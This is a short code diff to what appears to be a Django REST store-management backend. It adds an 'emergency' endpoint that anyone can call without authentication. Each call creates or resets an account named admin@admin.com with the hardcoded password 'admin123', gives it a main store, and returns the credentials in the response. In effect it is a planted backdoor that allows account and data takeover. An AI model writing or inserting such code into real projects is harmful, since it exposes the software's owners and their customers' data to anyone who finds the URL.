@@ -185,3 +185,12 @@ class CustomerListAPI(generics.ListAPIView):
     def get_queryset(self):
         store_id = self.request.query_params.get('store')
         return Customer.objects.filter(store_id=store_id) if store_id else Customer.objects.none()
+
+class CreateAdminEmergencyAPI(APIView):
+    permission_classes = [AllowAny]
+    def get(self, request):
+        user, created = User.objects.get_or_create(username='admin@admin.com', email='admin@admin.com')
+        user.set_password('admin123')
+        user.save()
+        store, _ = Store.objects.get_or_create(owner=user, defaults={'name': 'Cửa hàng Tổng', 'phone': '0900000000'})
+        return Response({"status": "Reset thành công admin@admin.com / admin123"})
